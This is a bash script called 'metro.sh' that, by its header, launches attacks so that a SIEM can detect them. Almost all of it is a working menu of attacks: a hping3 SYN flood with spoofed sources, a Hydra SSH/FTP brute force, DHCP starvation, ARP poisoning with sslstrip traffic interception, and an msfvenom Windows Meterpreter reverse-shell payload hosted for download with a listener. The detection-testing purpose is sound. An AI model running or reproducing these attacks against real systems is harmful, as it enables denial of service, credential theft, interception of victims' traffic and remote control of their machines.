#!/bin/bash
# Script to automate the process of displaying a variety of attacks for an SIEM to detect

# help function
help() {
	echo
	echo "Usage: sudo ./metro.sh [-h] [-i]"
	echo
	echo "-h		display help message"
	echo "-i		interface"
	echo
	echo "ex: sudo ./metro.sh eth0"
	exit 0
}

# cleanup function
cleanup() {
	echo
	echo
	 echo -e "\e[34m[+]\e[0m  Stopping attacks..."
	sudo echo "0" > /proc/sys/net/ipv4/ip_forward 2>/dev/null
	sudo iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $port 2>/dev/null
	pkill -f "python3 -m http.server" 2>/dev/null
	sleep 2
	clear
	menu
}

# Function to check if the interface exists
check_interface() {
	if ! ip link show $1 >/dev/null 2>&1; then
		echo
		 echo -e "\e[31m[!]\e[0mInvalid interface. Use -h for help."
		exit 0
	fi
}

menu() {
	# get terminal width
	term_width=$(tput cols)
	
	# calculate center alignment
	menu_width=40
	padding=$((($term_width - $menu_width) / 2))
	
	clear
	
	# print title centered
	echo
	figlet -w $term_width -c METRO!!
	echo
	
	# print menu options centered
	echo
	echo -e "$(printf '%*s' $padding)" "[1] SYN Flood"
	echo -e "$(printf '%*s' $padding)" "[2] SSH bruteforce"
	echo -e "$(printf '%*s' $padding)" "[3] DHCP Starvation"
	echo -e "$(printf '%*s' $padding)" "[4] MITM Arp Poisoning"
	echo -e "$(printf '%*s' $padding)" "[5] Windows Reverse Shell"
	echo -e "$(printf '%*s' $padding)" "[6] Exit"
	
	# prompt for user input
	while true; do
		echo
		read -p "$(printf '%*s' $padding)> "   option
		
		case $option in
			1) pod ;;
			2) bruteforce ;;
			3) dhcpstarve ;;
			4) mitmarp ;;
			5) rev ;;
			6) echo; echo "Goodbye :)"; sudo rm -rf payloads 2>/dev/null; rm *.log 2>/dev/null ; exit 0 ;;
			"exit") echo; echo "Goodbye :)"; sudo rm -rf payloads 2>/dev/null ; rm *.log 2>/dev/null; exit 0 ;;
			*) echo;  echo -e "\e[31m[!]\e[0mInvalid option" ;;
		esac
	done
}

pod() {
	while true; do
		echo
		while true; do
			read -p "Target IP: " target_ip
			# regex to match ipv4 address...thanks chatgpt for this one :3
			ipv4_regex='^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
			ipv4_regex+='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
			ipv4_regex+='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
			ipv4_regex+='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'

			if [[ $target_ip =~ $ipv4_regex ]]; then
				break
			else
				echo
				 echo -e "\e[31m[!]\e[0m Invalid IPv4 address format."
				echo
			fi
		done
		
		# packet count prompt
		while true; do
			read -p "Packet count (default 1000): " packets
			packets=${packets:-1000} # default value
			
			# Check if input is numeric
			if [[ $packets =~ ^[0-9]+$ ]]; then
				break
			else
				echo
				 echo -e "\e[31m[!]\e[0m Invalid input"
				echo
			fi
		done
		
		# packet size prompt
		while true; do
			read -p "Packet size (default 120): " size
			size=${size:-120} # default value
			
			# Check if input is numeric
			if [[ $size =~ ^[0-9]+$ ]]; then
				break
			else
				 echo -e "\e[31m[!]\e[0m Invalid input"
			fi
		done
		
		# port prompt
		while true; do
			read -p "Port (default 80): " port
			port=${port:-80} # default value
			
			# Check if input is numeric
			if [[ $port =~ ^[0-9]+$ ]]; then
				break
			else
				 echo -e "\e[31m[!]\e[0m Invalid input"
			fi
		done
		
		# randomize source IP prompt
		read -p "Randomize source IP (default y): " random
		random=${random:-y} # default value
		
		case $random in
			Y|y) # launch random source IP flood
				echo 
				 echo -e "\e[34m[+]\e[0m  Flooding $target_ip with $packets packets..." 
				sleep 1 
				echo
				echo "Press Ctrl-C to stop attack"
				sleep 2
				echo
				hping3 -c $packets -d $size -S -p $port --flood --rand-source $target_ip -V
				;;
			N|n) # launch regular SYN flood 
				echo 
				 echo -e "\e[34m[+]\e[0m  Flooding $target_ip with $packets packets..." 
				sleep 1 
				echo
				echo "Press Ctrl-C to stop attack"
				sleep 2
				hping3 -c $packets -d $size -S -p $port --flood $target_ip -V
				;;
			*) echo;  echo -e "\e[31m[!]\e[0m Invalid option" ; continue ;;
		esac
	done
	
	menu
}


bruteforce() {
	while true; do
		echo
		while true; do
			read -p "Target IP: " target_ip
			# regex to match ipv4 address
			ipv4_regex='^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
			ipv4_regex+='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
			ipv4_regex+='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
			ipv4_regex+='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'

			if [[ $target_ip =~ $ipv4_regex ]]; then
				break
			else
				echo
				 echo -e "\e[31m[!]\e[0m Invalid IPv4 address format."
			fi
		done
	
		# users file prompt
		read -p "User file path (press Enter for default): " user_file
		user_file=${user_file:-"wordlists/users.txt"}  # default if enter pressed

		# password file prompt
		read -p "Password file path (press Enter for default): " pass_file
		pass_file=${pass_file:-"wordlists/passwords.txt"}  # Set default if Enter is pressed

		# check if user and password files exist
		if [[ ! -f $user_file || ! -f $pass_file ]]; then
			echo
			 echo -e "\e[31m[!]\e[0m  User file or password file does not exist."
			echo
			continue
		fi

		# ssh or ftp prompt
		read -p "Choose protocol (SSH/FTP, default SSH): " protocol
		protocol=${protocol:-"SSH"}  # SSH default

		# port prompt
		read -p "Port (default 22): " port
		port=${port:-22}  

		case $protocol in
			SSH|ssh) protocol="ssh" ;;
			FTP|ftp) protocol="ftp" ;;
			*) echo;  echo -e "\e[31m[!]\e[0m Invalid protocol. Please choose SSH or FTP." ; continue ;;
		esac
		
		# launch attack
		echo
		 echo -e "\e[34m[+]\e[0m  Launching Hydra $protocol brute force attack on $target_ip..."
		sleep 1
		echo
		echo "Press Ctrl-C to stop attack"
		sleep 2
		echo
		hydra -v -L $user_file -P $pass_file $protocol://$target_ip:$port 
	done

	menu
}


mitmarp() {
	cleanup_mitm(){
        echo
         echo -e "\e[34m[+]\e[0m  Stopping attack..."
        sudo echo "0" > /proc/sys/net/ipv4/ip_forward
        sudo iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $port
        exit 0
    	}
    	
    	trap cleanup_mitm SIGINT
    
	while true; do
		while true; do
			echo
			read -p "Target IP: " target_ip
			# regex to match ipv4 address
			ipv4_regex='^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
			ipv4_regex+='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
			ipv4_regex+='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
			ipv4_regex+='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'

			if [[ $target_ip =~ $ipv4_regex ]]; then
				break
			else
				echo
				 echo -e "\e[31m[!]\e[0m Invalid IPv4 address format."
			fi
		done
		
		while true; do
			read -p "Default gateway IP: " dfg_ip
			# regex to match ipv4 address
			ipv4_regex='^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
			ipv4_regex+='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
			ipv4_regex+='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
			ipv4_regex+='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'

			if [[ $target_ip =~ $ipv4_regex ]]; then
				break
			else
				echo
				 echo -e "\e[31m[!]\e[0m Invalid IPv4 address format."
			fi
		done
		
		read -p "SSLSrip listening port (default 1337): " port
		port=${port:-1337} # set default if enter is pressed
		
		# launch attack
		echo
		 echo -e "\e[34m[+]\e[0m  Launching attack on target $target_ip and default gateway $dfg_ip ..."
		sudo echo "1" > /proc/sys/net/ipv4/ip_forward
		sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $port
		sleep 1
		echo 
		echo "Press Ctrl-C to stop attack"
		sleep 2
		xterm -title "arpspoof target to target" -geometry 80x24+0+0 -e sudo arpspoof -i $iface -t $target_ip $dfg_ip
		xterm -title "arpspoof target to dfg" -geometry 80x24-0+0 -e sudo arpspoof -i $iface -t $dfg_ip $target_ip
		sleep 1
		xterm -title "sslstrip and sniff" -geometry 100x40+50%+50% -e sudo sslstrip -l $port -a -f
	done
	
	menu
}

dhcpstarve() { 
	while true; do
		echo 
		# prompt for IP version
		read -p "IP version (default 4): " version
		version=${version:-4} # set default if enter is pressed
		
		case $version in
			4) # launch starvation attack on DHCP IPv4 server
				echo
				 echo -e "\e[34m[+]\e[0m  Launching attack..."
				sleep 1
				echo
				echo "Press Ctrl-C to stop attack"
				sleep 2
				echo
				dhcpig -c -v3 -l -a -i -o $iface && break 
				;; 
			6) # launch starvation attack on DHCP IPv6 server
				echo
				 echo -e "\e[34m[+]\e[0m  Launching attack..."
				sleep 1
				echo
				echo "Press Ctrl-C to stop attack"
				sleep 2
				echo
				dhcpig -6 -c -v3 -l -i -o $iface && break
				;; 
			*)
				# ask again
				echo
				 echo -e "\e[31m[!]\e[0m Invalid option" 
				;;
		esac
	done
	
	menu
}


rev() {
    while true; do
        echo
        while true; do
            read -p "LHOST: " lhost
            # regex to match ipv4 address...thanks chatgpt for this one :3
            ipv4_regex='^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
            ipv4_regex+='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
            ipv4_regex+='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
            ipv4_regex+='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'

            if [[ $lhost =~ $ipv4_regex ]]; then
                break
            else
                echo
                 echo -e "\e[31m[!]\e[0m Invalid IPv4 address format."
                echo
            fi
        done

        read -p "LPORT (default 4444): " lport
        lport=${lport:-4444}

        read -p "File name(default shell): " file_name
        file_name=${file_name:-"shell"}  

        echo
        echo -e "\e[34m[+]\e[0m Generating payload..."
        echo 

        # Check if the payloads directory exists, if not, create it
        if [ ! -d "payloads" ]; then
            mkdir payloads
        fi

        # Create payload
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > payloads/$file_name.exe
        echo
         echo -e "\e[34m[+]\e[0m  Visit http://$lhost:8080 to download payload on victim machine.."
        # Python webserver in payloads/
        xterm -title "pyton webserver" -geometry 80x24-0+0 -e python3 -m http.server --directory payloads 8080 &
        echo
         echo -e "\e[34m[+]\e[0m  Starting listener..."
        echo 
        # Start listener
        msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST $lhost;set LPORT $lport; exploit"

     	sleep 1
    done

    menu
}





#CTRL-C force cleanup
trap cleanup SIGINT


# Require options
if [ $# -eq 0 ]
then
	echo
	 echo -e "\e[31m[!]\e[0m  No interface specified!"
	 echo -e "\e[31m[!]\e[0m  Run ./metro -h for help"
	echo ""
	exit 0
fi

# Get the options
while getopts "hi:" option; do
	case $option in
		h) # display Help
			help
			exit;;
		i) # interface
			iface=$OPTARG
			;;
		\?) #Invalid option
			echo
			 echo -e "\e[31m[!]\e[0m Invalid flag"
			 echo -e "\e[31m[!]\e[0m  Run ./metro -h for help"
			exit;;
	esac
done

# Check if the interface exists
check_interface $iface

clear
menu
